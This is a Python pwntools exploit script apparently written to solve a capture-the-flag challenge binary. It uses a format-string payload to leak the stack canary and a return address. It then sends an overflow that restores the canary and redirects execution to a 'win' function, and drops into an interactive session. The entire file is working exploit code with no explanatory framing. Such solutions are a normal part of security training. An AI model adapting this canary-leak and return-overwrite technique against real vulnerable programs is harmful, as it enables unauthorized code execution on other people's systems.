from pwn import *
from struct import pack
import time

context.terminal = ['kitty', '@', 'launch', '--keep-focus']

# io = gdb.debug('./chall', gdbscript='''
# # break main
# continue
# ''')

io = ELF('./chall').process()

io.recvuntil(b'@ ')
line = io.recvline()
ret_addr = line[:line.find(b', ')]
print('ret_addr', ret_addr)

io.recvuntil(b'name: ')

# canary is at arg 13
# ret addr is at arg 17
# (ret addr) 0x563482fd0637 - 0x563482fd0619 (win) = 30 (base 10)
io.sendline(b'%13$p.%17$p')

line = io.recvuntil(b', ')
canary = io.recvuntil(b'.')[:-1]
main_addr = io.recvuntil(b'.')[:-1]
print('canary', canary)
print('main_addr', main_addr)

io.recvuntil(b'input: ')

canary = p64(int(canary, 16))

# 24 bytes junk
# canary
# 8 bytes junk
# new ret addr
win_addr = p64(int(main_addr, 16)-30)
pwnmsg = b'\x00'*24+canary+b'\x00'*8+win_addr
io.sendline(pwnmsg)

io.interactive()
